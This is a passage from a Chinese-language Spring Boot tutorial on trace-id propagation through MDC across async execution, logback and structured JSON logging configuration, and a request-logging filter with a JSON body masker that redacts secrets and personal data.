所以要有一個測試確認 `TracingTraceIdProvider` bean 一定存在。

⚠️ **這個反射實作只是為了讓課程程式碼「不加依賴也能跑」。**
**實務上直接依賴 `Tracer` 型別**（註解裡的簡化版），因為：
- 反射慢（每個請求都呼叫三次 `Method.invoke`）。
- 型別錯誤變成執行時錯誤。

**兩種模式的對照**：

| 專案情況 | traceId 來源 | 回應 header |
|---|---|---|
| 單體服務，沒有分散式追蹤 | `TraceContext.generate()`（16 hex） | 我們的 filter 寫 |
| 有 OTel / Zipkin | Micrometer 的 traceId（32 hex） | 我們的 filter 寫 |
| 有 API Gateway 但沒有追蹤 | Gateway 的 `X-Request-Id` | 我們的 filter 寫 |

⚠️ **注意 OTel 的 traceId 是 32 個 hex 字元（128 bit）**，
比我們自己的 16 字元長。給使用者看的短版（`shortForm`）仍然取前 8 碼，
但要確認你的 log 查詢用的是**前綴比對**而不是完全比對。

### 4.5.6 MDC 與 `ThreadLocal`、虛擬執行緒

**MDC 的實作是 `ThreadLocal`**（Logback 的 `LogbackMDCAdapter`）。

這代表三件事：

| 情況 | MDC 的行為 |
|---|---|
| 同一條執行緒的所有 log | ✅ 都有 traceId |
| `new Thread(...)` 或執行緒池 | ❌ **不繼承** |
| 虛擬執行緒 | ✅ 每條虛擬執行緒有自己的 `ThreadLocal` → 正常運作 |

⚠️ **「不繼承」這件事在歷史上有變化。**
Logback 早期版本的 `LogbackMDCAdapter` 用 `InheritableThreadLocal`
（新執行緒會複製父執行緒的 MDC），後來改成 `ThreadLocal`。

**不要依賴繼承行為** —— 不同版本不同，而且「繼承」在執行緒池裡是**錯的**
（執行緒被重用時會繼承到「第一次建立時的」MDC，那是別人的 traceId）。

**明確傳遞才可靠**（4.5.7）。

**虛擬執行緒的三個影響**（第 00 章 0.9.3 的續集）：

| 影響 | 說明 |
|---|---|
| **MDC 正常運作** | 每條虛擬執行緒有獨立的 `ThreadLocal`，而且不重用 → **不需要清理也不會洩漏** |
| ⚠️ **但仍然要清理** | 因為你不能假設一定跑在虛擬執行緒上（設定可能被關掉） |
| **`ThreadLocal` 的成本變高** | 虛擬執行緒可以有上百萬條，每條的 `ThreadLocal` map 都是記憶體。MDC 只放少量欄位（我們放 5 個）是刻意的 |

⚠️ **不要在 MDC 裡放大物件。** 見過有人把整個 `User` 物件放進 MDC ——
在 10,000 個並行請求下就是 10,000 份。

### 4.5.7 非同步的三種傳遞 ★

**這是 traceId 最容易漏掉的地方。**

#### 情況 1：`@Async` 方法

```java
@Async
public void sendNotification(String orderId) {
    log.info("寄送通知 orderId={}", orderId);      // ← MDC 是空的！
}
```

**解法：`TaskDecorator`。**

```java
package example.shop.common.config;

import org.slf4j.MDC;
import org.springframework.core.task.TaskDecorator;

import java.util.Map;

/**
 * 把提交任務時的 MDC 複製到執行任務的執行緒上。
 *
 * <p>⚠️ 三個必要細節：
 * <ol>
 *   <li>{@code getCopyOfContextMap()} 在提交端呼叫（此時 MDC 還在）。</li>
 *   <li>執行端要先「清空」再設定 —— 執行緒池的執行緒可能殘留上一個任務的 MDC。</li>
 *   <li>{@code finally} 一定要清理，否則污染下一個任務。</li>
 * </ol>
 */
public class MdcTaskDecorator implements TaskDecorator {

    @Override
    public Runnable decorate(Runnable runnable) {
        // ★ 在「提交任務的執行緒」上取得快照
        Map<String, String> snapshot = MDC.getCopyOfContextMap();

        return () -> {
            Map<String, String> previous = MDC.getCopyOfContextMap();
            try {
                MDC.clear();                                  // ★ 先清乾淨
                if (snapshot != null) MDC.setContextMap(snapshot);
                runnable.run();
            } finally {
                MDC.clear();
                if (previous != null) MDC.setContextMap(previous);
            }
        };
    }
}
```

```java
@Configuration
@EnableAsync
public class AsyncConfig implements AsyncConfigurer {

    @Override
    public java.util.concurrent.Executor getAsyncExecutor() {
        var executor = new org.springframework.scheduling.concurrent
                .ThreadPoolTaskExecutor();
        executor.setCorePoolSize(4);
        executor.setMaxPoolSize(16);
        executor.setQueueCapacity(200);
        executor.setThreadNamePrefix("shop-async-");
        executor.setTaskDecorator(new MdcTaskDecorator());        // ★
        // ⚠️ 佇列滿了要有明確策略，預設是 AbortPolicy（拋 RejectedExecutionException）
        executor.setRejectedExecutionHandler(
                new java.util.concurrent.ThreadPoolExecutor.CallerRunsPolicy());
        executor.initialize();
        return executor;
    }

    /** @Async 方法拋的例外不會進 advice（第 00 章 0.8.2 情況 5）。 */
    @Override
    public org.springframework.aop.interceptor.AsyncUncaughtExceptionHandler
            getAsyncUncaughtExceptionHandler() {
        return (ex, method, params) -> org.slf4j.LoggerFactory
                .getLogger(AsyncConfig.class)
                .error("@Async 方法拋出未處理的例外 method={} traceId={}",
                        method.getName(), TraceContext.current(), ex);
    }
}
```

⚠️ **`CallerRunsPolicy` 的取捨**：佇列滿時由呼叫端執行 →
非同步變同步 → 佔用 Tomcat 執行緒。
但**比 `AbortPolicy`（丟掉任務）好** —— 通知信寧可慢也不要不寄。
（05-service 第 05 章會完整討論。）

#### 情況 2：Spring MVC 的非同步回傳（`Callable` / `DeferredResult`）

```java
@GetMapping("/order-exports/{id}/status")
public Callable<ExportStatus> status(@PathVariable String id) {
    return () -> {
        log.info("查詢匯出狀態");          // ← MDC 是空的
        return exportService.status(id);
    };
}
```

**解法：設定 MVC 的非同步 executor 也用 `MdcTaskDecorator`。**

```java
@Configuration
public class WebMvcConfig implements WebMvcConfigurer {

    @Override
    public void configureAsyncSupport(AsyncSupportConfigurer configurer) {
        var executor = new org.springframework.scheduling.concurrent
                .ThreadPoolTaskExecutor();
        executor.setCorePoolSize(4);
        executor.setMaxPoolSize(32);
        executor.setQueueCapacity(100);
        executor.setThreadNamePrefix("shop-mvc-async-");
        executor.setTaskDecorator(new MdcTaskDecorator());        // ★
        executor.initialize();

        configurer.setTaskExecutor(executor);
        configurer.setDefaultTimeout(30_000);      // ★ 一定要設，預設是無限
    }
}
```

⚠️ **`setDefaultTimeout` 沒設的後果**：
非同步請求永遠不逾時 → Tomcat 的連線一直被佔住 →
連線數上限（`server.tomcat.max-connections`，預設 8192）耗盡。

設了之後逾時會拋 `AsyncRequestTimeoutException` → 進 advice → 503（03 章 3.7.1 的表）。

#### 情況 3：`SseEmitter`（05 章的主題）

```java
@GetMapping("/orders/{id}/events")
public SseEmitter events(@PathVariable String id) {
    var emitter = new SseEmitter(300_000L);
    // 事件從別的執行緒（例如訊息佇列的 listener）送出
    eventBus.subscribe(id, event -> {
        log.info("推送事件");           // ← MDC 是空的，而且和原請求無關
        emitter.send(event);
    });
    return emitter;
}
```

**這個情況不能靠 `TaskDecorator`**，因為事件是「訂閱後才發生的」，
和原始請求已經沒有時間關聯。

**正確做法：把 traceId 存進訂閱物件，發送時明確設定。**

```java
@GetMapping("/orders/{orderId}/events")
public SseEmitter events(@PathVariable("orderId") String orderId) {
    String traceId = TraceContext.current();        // ★ 在請求執行緒上抓下來
    var emitter = new SseEmitter(300_000L);

    eventBus.subscribe(orderId, event -> {
        MDC.put(TraceContext.MDC_TRACE_ID, traceId);      // ★ 明確設定
        try {
            log.info("推送事件 type={}", event.type());
            emitter.send(SseEmitter.event().name(event.type()).data(event));
        } catch (IOException e) {
            log.debug("SSE 客戶端已斷線 orderId={}", orderId);
            emitter.completeWithError(e);
        } finally {
            MDC.remove(TraceContext.MDC_TRACE_ID);         // ★ 清理
        }
    });
    return emitter;
}
```

⚠️ **這裡的 traceId 語意有點特殊**：它是「建立訂閱那個請求」的 traceId，
而不是「這個事件」的。實務上這正是你要的（能追到是哪個連線），
但如果你有分散式追蹤，更好的做法是為每次推送開一個新的 span
（parent 是原請求的 span）。

### 4.5.8 logback 設定

```xml
<!-- src/main/resources/logback-spring.xml -->
<configuration>
    <include resource="org/springframework/boot/logging/logback/defaults.xml"/>

    <property name="LOG_PATTERN"
              value="%d{yyyy-MM-dd HH:mm:ss.SSS} [%thread] %-5level [%X{traceId:-}] %logger{40} - %replace(%msg){'[\r\n]', '\\n'}%n"/>

    <!-- 本機：人類可讀 -->
    <springProfile name="local">
        <appender name="CONSOLE" class="ch.qos.logback.core.ConsoleAppender">
            <encoder>
                <pattern>${LOG_PATTERN}</pattern>
            </encoder>
        </appender>
        <root level="INFO">
            <appender-ref ref="CONSOLE"/>
        </root>
    </springProfile>

    <!-- 正式環境：JSON（結構化，4.6.5）-->
    <springProfile name="prod">
        <appender name="JSON" class="ch.qos.logback.core.ConsoleAppender">
            <encoder class="net.logstash.logback.encoder.LogstashEncoder">
                <includeMdcKeyName>traceId</includeMdcKeyName>
                <includeMdcKeyName>actorId</includeMdcKeyName>
                <includeMdcKeyName>actorType</includeMdcKeyName>
                <includeMdcKeyName>endpoint</includeMdcKeyName>
                <includeMdcKeyName>clientIp</includeMdcKeyName>
                <!-- ★ 不要 includeContext（它會加一堆沒用的欄位）-->
                <includeContext>false</includeContext>
                <!-- ★ stack trace 縮短，只留最相關的幀 -->
                <throwableConverter class="net.logstash.logback.stacktrace.ShortenedThrowableConverter">
                    <maxDepthPerThrowable>20</maxDepthPerThrowable>
                    <maxLength>4096</maxLength>
                    <shortenedClassNameLength>30</shortenedClassNameLength>
                    <exclude>^sun\.reflect\..*</exclude>
                    <exclude>^java\.lang\.reflect\..*</exclude>
                    <exclude>^org\.springframework\.aop\..*</exclude>
                    <exclude>^org\.springframework\.web\.servlet\..*</exclude>
                    <rootCauseFirst>true</rootCauseFirst>
                </throwableConverter>
            </encoder>
        </appender>
        <root level="INFO">
            <appender-ref ref="JSON"/>
        </root>
    </springProfile>
</configuration>
```

**`ShortenedThrowableConverter` 的價值**：

| 設定 | 效果 |
|---|---|
| `rootCauseFirst=true` | **根因排在最前面** —— 你不用往下滑 40 行才看到真正的原因 |
| `exclude` reflection / AOP 的幀 | 一個 NPE 的 stack trace 從 80 行變成 15 行 |
| `maxLength=4096` | 防止單一 log 事件塞爆日誌系統 |

⚠️ **`net.logstash.logback:logstash-logback-encoder` 是額外依賴**：

```xml
<dependency>
  <groupId>net.logstash.logback</groupId>
  <artifactId>logstash-logback-encoder</artifactId>
  <version>7.4</version>
</dependency>
```

**不想加依賴的替代方案**：Spring Boot 3.4+ 內建了 structured logging：

```yaml
logging:
  structured:
    format:
      console: ecs        # 或 logstash / gelf
```

⚠️ 這是 Boot **3.4** 的功能，3.2 沒有。**課程基準是 3.2，所以用 logstash-logback-encoder。**

---

## 4.6 請求日誌

### 4.6.1 記什麼

**先問：這條 log 是給誰看的？**

| 讀者 | 需要什麼 | 什麼時候看 |
|---|---|---|
| 值班工程師 | 狀態碼、耗時、traceId、例外 | 告警觸發時 |
| 除錯的開發者 | 完整的 request / response body | 追一個特定 bug |
| 客服 | 這個 traceId 發生了什麼 | 客訴時 |
| 資安 | 誰在什麼時候從哪個 IP 做了什麼 | 事件調查 |
| 成本 | ⚠️ **每一個位元組都要付錢** | 月底 |

**最後一項決定了設計**：不可能什麼都記。

### 4.6.2 三層日誌策略

```
第一層：所有請求（永遠開）
   method、path（模板化）、status、耗時、traceId、actorId、clientIp
   → 約 200 bytes/請求

第二層：錯誤請求（4xx / 5xx，永遠開）
   加上：request body（遮蔽後、截斷）、query string（遮蔽後）
   → 約 1 KB/請求

第三層：完整 body（預設關，可動態開啟）
   request + response body 完整內容
   → 約 5～50 KB/請求
```

**成本試算**（每秒 200 請求、錯誤率 2%）：

| 層 | 每天資料量 |
|---|---|
| 第一層 | 200 × 86400 × 200 B ≈ **3.5 GB** |
| 第二層 | 200 × 86400 × 2% × 1 KB ≈ **350 MB** |
| 第三層（全開） | 200 × 86400 × 20 KB ≈ **345 GB** ⚠️ |

**第三層全開一天就是 345 GB。** 這就是為什麼它必須是「可動態開啟」而不是「預設開」。

### 4.6.3 完整實作

```java
package example.shop.common.web;

import jakarta.servlet.FilterChain;
import jakarta.servlet.ServletException;
import jakarta.servlet.http.HttpServletRequest;
import jakarta.servlet.http.HttpServletResponse;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;
import org.slf4j.MDC;
import org.springframework.core.annotation.Order;
import org.springframework.stereotype.Component;
import org.springframework.web.filter.OncePerRequestFilter;
import org.springframework.web.servlet.HandlerMapping;

import java.io.IOException;
import java.nio.charset.StandardCharsets;
import java.util.concurrent.atomic.AtomicLong;

/**
 * 請求日誌。三層策略（4.6.2）：
 * <ol>
 *   <li>所有請求記一行摘要。</li>
 *   <li>4xx / 5xx 額外記 request body。</li>
 *   <li>{@code api.logging.bodies=true} 時記完整 body（除錯用，預設關）。</li>
 * </ol>
 */
@Component
@Order(-116)
public class RequestLoggingFilter extends OncePerRequestFilter {

    private static final Logger log = LoggerFactory.getLogger("example.shop.api.access");

    private static final int MAX_BODY_LOG_LENGTH = 2048;

    private final RequestLoggingProperties properties;
    private final BodyMasker bodyMasker;
    private final AtomicLong slowRequestCounter = new AtomicLong();

    public RequestLoggingFilter(RequestLoggingProperties properties, BodyMasker bodyMasker) {
        this.properties = properties;
        this.bodyMasker = bodyMasker;
    }

    @Override
    protected void doFilterInternal(HttpServletRequest request, HttpServletResponse response,
                                    FilterChain chain) throws ServletException, IOException {

        long startNanos = System.nanoTime();
        Throwable failure = null;

        try {
            chain.doFilter(request, response);
        } catch (Throwable t) {
            failure = t;
            throw t;
        } finally {
            long durationMs = (System.nanoTime() - startNanos) / 1_000_000;
            int status = response.getStatus();

            // ★ 用「路徑模板」而不是實際 URI（避免高基數，也讓 log 好聚合）
            String endpoint = endpointTemplate(request);
            MDC.put(TraceContext.MDC_ENDPOINT, endpoint);

            try {
                logRequest(request, status, durationMs, endpoint, failure);
            } catch (Exception loggingFailure) {
                // ★ 日誌本身失敗絕不能影響請求
                log.warn("請求日誌寫入失敗: {}", loggingFailure.getMessage());
            }
        }
    }

    private void logRequest(HttpServletRequest request, int status, long durationMs,
                            String endpoint, Throwable failure) {

        boolean isError = status >= 400;
        boolean isSlow = durationMs >= properties.slowRequestThresholdMs();
        boolean logBody = properties.logBodies() || isError;

        String bodyPart = "";
        if (logBody && request instanceof CachedBodyRequestWrapper cached) {
            String raw = new String(cached.cachedBody(), StandardCharsets.UTF_8);
            String masked = bodyMasker.mask(raw);
            bodyPart = " body=" + truncate(masked);
        }

        String query = maskedQueryString(request);

        // ── 第一層：所有請求 ────────────────────────────────
        if (status >= 500) {
            log.error("{} {}{} → {} ({} ms){}",
                    request.getMethod(), endpoint, query, status, durationMs, bodyPart);
        } else if (status >= 400) {
            log.info("{} {}{} → {} ({} ms){}",
                    request.getMethod(), endpoint, query, status, durationMs, bodyPart);
        } else if (isSlow) {
            // ★ 慢請求提升到 warn —— 它是效能問題的第一個訊號
            log.warn("慢請求 {} {}{} → {} ({} ms){}",
                    request.getMethod(), endpoint, query, status, durationMs, bodyPart);
            slowRequestCounter.incrementAndGet();
        } else {
            log.info("{} {}{} → {} ({} ms)",
                    request.getMethod(), endpoint, query, status, durationMs);
        }
    }

    /**
     * 取得路徑模板（{@code /orders/{orderId}}）而不是實際路徑。
     *
     * <p>⚠️ 這個 attribute 由 {@code RequestMappingHandlerMapping} 設定，
     * 所以只有「找到 handler」的請求才有。404 時回實際路徑。
     */
    private String endpointTemplate(HttpServletRequest request) {
        Object pattern = request.getAttribute(HandlerMapping.BEST_MATCHING_PATTERN_ATTRIBUTE);
        if (pattern != null) return pattern.toString();
        // 沒有 handler（404）→ 用實際路徑，但要限制長度（防日誌爆量）
        String uri = request.getRequestURI();
        return (uri.length() <= 200) ? uri : uri.substring(0, 200) + "…";
    }

    /** query string 也要遮蔽（可能有 token、email）。 */
    private String maskedQueryString(HttpServletRequest request) {
        String query = request.getQueryString();
        if (query == null || query.isBlank()) return "";
        return "?" + truncate(bodyMasker.maskQueryString(query));
    }

    private String truncate(String s) {
        if (s == null) return "";
        return (s.length() <= MAX_BODY_LOG_LENGTH)
                ? s
                : s.substring(0, MAX_BODY_LOG_LENGTH) + "…(截斷，原長度 " + s.length() + ")";
    }

    @Override
    protected boolean shouldNotFilter(HttpServletRequest request) {
        return properties.isExcluded(request.getRequestURI());
    }
}
```

⚠️ **`endpointTemplate` 用 `BEST_MATCHING_PATTERN_ATTRIBUTE` 是關鍵**。

沒有它的話，日誌會長這樣：

```
GET /orders/ord_01J5GKQ8Z4W9V2X3Y6N7M8P0QR → 200 (4 ms)
GET /orders/ord_01J5GKQ8Z4W9V2X3Y6N7M8P0QS → 200 (3 ms)
GET /orders/ord_01J5GKQ8Z4W9V2X3Y6N7M8P0QT → 200 (5 ms)
```

**你無法查詢「`GET /orders/{id}` 的 p99 延遲」** —— 每一行的 path 都不一樣。

有了模板：

```
GET /orders/{orderId} → 200 (4 ms)
GET /orders/{orderId} → 200 (3 ms)
```

**現在可以聚合了。**

⚠️ **但這個 attribute 在 filter 的 `finally` 裡才讀得到**
（因為它是 `DispatcherServlet` 在找 handler 時設定的）。
在 `chain.doFilter()` 之前讀是 `null`。

### 4.6.4 `BodyMasker`：遮蔽敏感欄位 ★

```java
package example.shop.common.web;

import com.fasterxml.jackson.core.JsonFactory;
import com.fasterxml.jackson.core.JsonGenerator;
import com.fasterxml.jackson.core.JsonParser;
import com.fasterxml.jackson.core.JsonToken;
import org.springframework.stereotype.Component;

import java.io.IOException;
import java.io.StringWriter;
import java.util.Locale;
import java.util.Set;

/**
 * 把 JSON 裡的敏感欄位換成 "***"。
 *
 * <p>⚠️ 為什麼不用正規表示式？
 * <ul>
 *   <li>正規表示式無法正確處理巢狀、跳脫字元、陣列。</li>
 *   <li>{@code "password":"a\"b"} 這種跳脫會讓 regex 抓錯範圍。</li>
 *   <li>而且遮蔽失敗的後果是「密碼進了日誌」—— 不能靠近似解。</li>
 * </ul>
 *
 * <p>所以用 Jackson 的 streaming API 逐個 token 處理：正確、而且不用建整棵樹。
 */
@Component
public class BodyMasker {

    private static final String MASK = "***";

    /**
     * 完全遮蔽的欄位名（不分大小寫、忽略底線與連字號）——<b>精確比對</b>。
     *
     * <p>⚠️ 這個集合只用於「完全相等」的比對。
     * 「包含」的模糊比對用 {@link #FUZZY_HINTS}（那份清單刻意短得多）。
     */
    private static final Set<String> FULLY_MASKED = Set.of(
            "password", "passwd", "pwd", "oldpassword", "newpassword",
            "secret", "clientsecret", "apikey", "apisecret",
            "token", "accesstoken", "refreshtoken", "idtoken", "authorization",
            "cvv", "cvc", "securitycode", "pin",
            "privatekey", "cookie", "sessionid");

    /**
     * 用「包含」比對的關鍵字 —— 抓 {@code customerPassword}、{@code userApiKey} 這種命名。
     *
     * <p>★★ 為什麼這是一份<b>獨立而且更短</b>的清單，而不是直接拿
     * {@link #FULLY_MASKED} 去做 {@code contains}：
     *
     * <p><b>因為短的關鍵字會誤傷正當欄位，而且是靜默的。</b>
     * 這門課的第一版真的踩了這個坑：
     *
     * <table>
     *   <tr><th>清單裡的字</th><th>誤傷的正當欄位</th><th>後果</th></tr>
     *   <tr><td>{@code "pin"}</td>
     *       <td>{@code shippingAddressId}、{@code shippingFee}、{@code shippingAddress}、
     *           {@code shippingMethod}</td>
     *       <td>🔴 <b>每一筆下單請求的收件地址與運費在日誌與稽核紀錄裡都是 {@code ***}</b> ——
     *           而稽核的目的正是「事後查得到當時送了什麼」</td></tr>
     *   <tr><td>{@code "cvc"}</td><td>—</td><td>目前沒有，但 {@code cvcCount} 之類的欄位會中</td></tr>
     *   <tr><td>{@code "token"}</td><td>{@code tokenizedCardLast4}</td>
     *       <td>⚠️ 這個「誤傷」其實是對的，所以 {@code token} 留在模糊清單裡</td></tr>
     * </table>
     *
     * <p>★ 而這個 bug 的可怕之處是<b>它看起來在正常工作</b> ——
     * 日誌裡有東西、格式正確、遮蔽也「有效」。
     * 只有在出事要查「當時客戶填的地址是什麼」的時候才會發現查不到。
     *
     * <p><b>規則</b>：模糊比對的關鍵字<b>長度至少 6</b>，而且要在
     * {@code BodyMaskerTest} 的「不可誤傷」清單裡測過（4.14.2）。
     */
    private static final Set<String> FUZZY_HINTS = Set.of(
            "password", "passwd", "secret", "apikey", "apisecret",
            "token", "authorization", "privatekey", "securitycode");

    /**
     * ★ 明確的「不可遮蔽」白名單 —— 優先於所有比對。
     *
     * <p>它存在的意義是「把踩過的坑釘住」：
     * 就算哪天有人往 {@link #FUZZY_HINTS} 加了一個短關鍵字，
     * 這些欄位仍然不會被誤遮，而 {@code BodyMaskerTest} 會告訴他為什麼。
     */
    private static final Set<String> NEVER_MASKED = Set.of(
            "shippingaddressid", "shippingaddress", "shippingfee", "shippingmethod",
            "billingaddressid", "billingaddress",
            "orderid", "ordernumber", "productid", "quantity", "couponcode");

    /** 部分遮蔽的欄位（保留末四碼，方便對帳）。 */
    private static final Set<String> PARTIALLY_MASKED = Set.of(
            "cardnumber", "accountnumber", "bankaccount", "iban");

    /** 個資（遮蔽中間，保留頭尾方便辨識）。 */
    private static final Set<String> PII_MASKED = Set.of(
            "email", "phone", "mobile", "telephone", "taxid",
            "nationalid", "idnumber", "recipient", "holdername");

    private final JsonFactory jsonFactory = new JsonFactory();

    /** 遮蔽 JSON body。非 JSON 或解析失敗時回傳安全的佔位字串。 */
    public String mask(String json) {
        if (json == null || json.isBlank()) return "";

        try (JsonParser parser = jsonFactory.createParser(json)) {
            StringWriter out = new StringWriter(Math.min(json.length() + 64, 8192));
            try (JsonGenerator generator = jsonFactory.createGenerator(out)) {
                copyWithMasking(parser, generator, null);
            }
            return out.toString();
        } catch (IOException e) {
            // ⚠️ 解析失敗時「絕不」回傳原文 —— 它可能含未遮蔽的密碼
            return "(無法解析的 body，長度 " + json.length() + ")";
        }
    }

    private void copyWithMasking(JsonParser parser, JsonGenerator generator,
                                 String currentField) throws IOException {
        JsonToken token = parser.nextToken();
        while (token != null) {
            switch (token) {
                case START_OBJECT -> { generator.writeStartObject(); currentField = null; }
                case END_OBJECT    -> generator.writeEndObject();
                case START_ARRAY   -> generator.writeStartArray();
                case END_ARRAY     -> generator.writeEndArray();
                case FIELD_NAME    -> {
                    currentField = parser.currentName();
                    generator.writeFieldName(currentField);
                }
                case VALUE_STRING  -> writeMaskedString(generator, currentField, parser.getText());
                case VALUE_NUMBER_INT, VALUE_NUMBER_FLOAT -> {
                    if (maskLevel(currentField) != MaskLevel.NONE) {
                        generator.writeString(MASK);
                    } else {
                        generator.writeNumber(parser.getText());
                    }
                }
                case VALUE_TRUE    -> generator.writeBoolean(true);
                case VALUE_FALSE   -> generator.writeBoolean(false);
                case VALUE_NULL    -> generator.writeNull();
                default            -> generator.writeString(MASK);
            }
            token = parser.nextToken();
        }
    }

    private void writeMaskedString(JsonGenerator generator, String field, String value)
            throws IOException {
        switch (maskLevel(field)) {
            case FULL    -> generator.writeString(MASK);
            case PARTIAL -> generator.writeString(keepLast4(value));
            case PII     -> generator.writeString(maskMiddle(value));
            case NONE    -> generator.writeString(truncateValue(value));
        }
    }

    private enum MaskLevel { NONE, FULL, PARTIAL, PII }

    private MaskLevel maskLevel(String field) {
        if (field == null) return MaskLevel.NONE;
        String normalized = field.toLowerCase(Locale.ROOT)
                .replace("_", "").replace("-", "");

        // ★★ 白名單最優先 —— 見 NEVER_MASKED 的說明
        if (NEVER_MASKED.contains(normalized))     return MaskLevel.NONE;

        // ① 精確比對
        if (FULLY_MASKED.contains(normalized))     return MaskLevel.FULL;
        if (PARTIALLY_MASKED.contains(normalized)) return MaskLevel.PARTIAL;
        if (PII_MASKED.contains(normalized))       return MaskLevel.PII;

        // ② 模糊比對（抓 customerPassword、userApiKey 這種命名）
        //    ⚠️ 用 FUZZY_HINTS 而不是 FULLY_MASKED —— 見那兩份清單的 javadoc
        for (String hint : FUZZY_HINTS) {
            if (normalized.contains(hint)) return MaskLevel.FULL;
        }
        for (String hint : PII_MASKED) {
            // ★ PII 的模糊比對只認「結尾」，避免 emailTemplateId 這種誤傷
            if (normalized.endsWith(hint)) return MaskLevel.PII;
        }
        return MaskLevel.NONE;
    }

    private String keepLast4(String value) {
        if (value == null || value.length() <= 4) return MASK;
        return "*".repeat(Math.min(value.length() - 4, 12)) + value.substring(value.length() - 4);
    }

    private String maskMiddle(String value) {
        if (value == null || value.length() <= 4) return MASK;
        int keep = Math.min(2, value.length() / 4);
        return value.substring(0, keep) + "***" + value.substring(value.length() - keep);
    }

    /** ★ 即使不是敏感欄位，超長的值也要截斷（避免單一欄位塞爆日誌）。 */
    private String truncateValue(String value) {
        if (value == null) return null;
        return (value.length() <= 200) ? value : value.substring(0, 200) + "…";
    }

    /** 遮蔽 query string 的敏感參數。 */
    public String maskQueryString(String query) {
        if (query == null || query.isBlank()) return "";
        StringBuilder sb = new StringBuilder(query.length());
        for (String pair : query.split("&")) {
            if (!sb.isEmpty()) sb.append('&');
            int eq = pair.indexOf('=');
            if (eq < 0) { sb.append(pair); continue; }
            String key = pair.substring(0, eq);
            String value = pair.substring(eq + 1);
            sb.append(key).append('=');
            sb.append(maskLevel(key) == MaskLevel.NONE ? truncateValue(value) : MASK);
        }
        return sb.toString();
    }
}
```

**為什麼用 Jackson streaming 而不是 regex？** ★

看這個 body：

```json
{"note": "我的 password 是 \"abc\"", "password": "real-secret"}
```

**regex 版本**（常見的做法）：

```java
body.replaceAll("\"password\"\\s*:\\s*\"[^\"]*\"", "\"password\":\"***\"")
```

`[^"]*` 遇到跳脫的 `\"` 會停下來 → **抓錯範圍**：

```json
{"note": "我的 password 是 \"***\"abc\"", "password": "real-secret"}
                                                       ↑ 沒被遮蔽！
```

**真正的密碼還在日誌裡。** 而且 body 變成無效的 JSON。

**streaming 版本正確處理**：

```json
{"note":"我的 password 是 \"abc\"","password":"***"}
```

⚠️ **`BodyMasker` 的測試見 4.14.5 —— 那裡有一組
「不可以被誤遮」的案例，比「該遮的有遮」更容易被忽略。**


⚠️ **`mask()` 解析失敗時回傳佔位字串而不是原文** —— 這是刻意的。
「無法解析」通常意味著 body 不是 JSON（或被截斷），
而那時候回傳原文的風險（可能含密碼）大於失去日誌的損失。

### 4.6.5 為什麼要結構化日誌

**非結構化（傳統 pattern）**：

```
2026-08-20 14:03:12.441 [http-nio-8080-exec-7] INFO  [4f2c8a1e9b7d3f60] e.s.a.access - POST /orders → 409 (127 ms) body={"items":[...]}
```

**要查「昨天所有超過 1 秒的 POST /orders」** → 只能用正規表示式硬解，
而且「127 ms」要 parse 成數字才能比較。

**結構化（JSON）**：

```json
{
  "@timestamp": "2026-08-20T14:03:12.441Z",
  "level": "INFO",
  "logger_name": "example.shop.api.access",
  "thread_name": "http-nio-8080-exec-7",
  "message": "POST /orders/{orderId}/payments → 409 (127 ms)",
  "traceId": "4f2c8a1e9b7d3f60",
  "actorId": "cus_01J5GK",
  "actorType": "CUSTOMER",
  "endpoint": "/orders/{orderId}/payments",
  "clientIp": "203.0.113.42"
}
```

**現在可以查詢**：

```
# Loki / LogQL
{app="shop-service"} | json | endpoint="/orders" and duration_ms > 1000
```

⚠️ **但 `duration_ms` 要是一個獨立欄位，不能只在 message 裡。**

**用 `StructuredArguments` 把它變成欄位**：

```java
import static net.logstash.logback.argument.StructuredArguments.keyValue;

log.info("{} {} → {}",
        request.getMethod(), endpoint, status,
        keyValue("durationMs", durationMs),
        keyValue("statusCode", status),
        keyValue("httpMethod", request.getMethod()),
        keyValue("endpoint", endpoint));
```

產生：

```json
{
  "message": "POST /orders/{orderId}/payments → 409",
  "durationMs": 127,
  "statusCode": 409,
  "httpMethod": "POST",
  "endpoint": "/orders/{orderId}/payments",
  "traceId": "4f2c8a1e9b7d3f60"
}
```

⚠️ **`keyValue` 的欄位名要固定** —— 別讓同一個概念有 `duration`、`durationMs`、`elapsed` 三種名字。
**把它們變成常數**：

```java
package example.shop.common.web;

/** 結構化日誌的欄位名。集中管理避免同一概念多個名字。 */
public final class LogFields {
    public static final String DURATION_MS = "durationMs";
    public static final String STATUS_CODE = "statusCode";
    public static final String HTTP_METHOD = "httpMethod";
    public static final String ENDPOINT = "endpoint";
    public static final String ERROR_CODE = "errorCode";
    public static final String IDEMPOTENCY_KEY = "idempotencyKey";
    public static final String ORDER_ID = "orderId";
    private LogFields() {}
}
```

### 4.6.6 動態開啟完整 body 日誌

第三層（4.6.2）不能常開，但除錯時需要。**做成可動態切換**：

```java
package example.shop.common.web;

import org.springframework.boot.context.properties.ConfigurationProperties;
import org.springframework.web.util.pattern.PathPattern;
import org.springframework.web.util.pattern.PathPatternParser;

import java.util.List;

@ConfigurationProperties(prefix = "api.logging")
public class RequestLoggingProperties {

    /** 是否記錄完整 body（除錯用，正式環境預設 false）。 */
    private volatile boolean logBodies = false;

    /** 超過這個毫秒數就用 warn 記錄。 */
    private long slowRequestThresholdMs = 1000;

    private List<String> excludePatterns = List.of(
            "/actuator/**", "/swagger-ui/**", "/v3/api-docs/**", "/favicon.ico");

    private volatile List<PathPattern> compiledExcludes = compile(excludePatterns);

    private static List<PathPattern> compile(List<String> patterns) {
        var parser = PathPatternParser.defaultInstance;
        return patterns.stream().map(parser::parse).toList();
    }

    public boolean isExcluded(String path) {
        var container = org.springframework.http.server.PathContainer.parsePath(path);
        return compiledExcludes.stream().anyMatch(p -> p.matches(container));
    }

    public boolean logBodies() { return logBodies; }
    public void setLogBodies(boolean logBodies) { this.logBodies = logBodies; }
    public long slowRequestThresholdMs() { return slowRequestThresholdMs; }
    public void setSlowRequestThresholdMs(long v) { this.slowRequestThresholdMs = v; }
    public List<String> getExcludePatterns() { return excludePatterns; }
    public void setExcludePatterns(List<String> patterns) {
        this.excludePatterns = List.copyOf(patterns);
        this.compiledExcludes = compile(this.excludePatterns);
    }
}
```

**動態切換的三種方式：**

| 方式 | 做法 | 取捨 |
|---|---|---|
| **Actuator 的 `/actuator/env`** | `POST /actuator/env` 改屬性 | ⚠️ 需要開啟 `env` 端點的寫入，安全風險高 |
| **自己開一個受保護的端點** | `POST /admin/logging/bodies` | ✅ 可控、可稽核 |
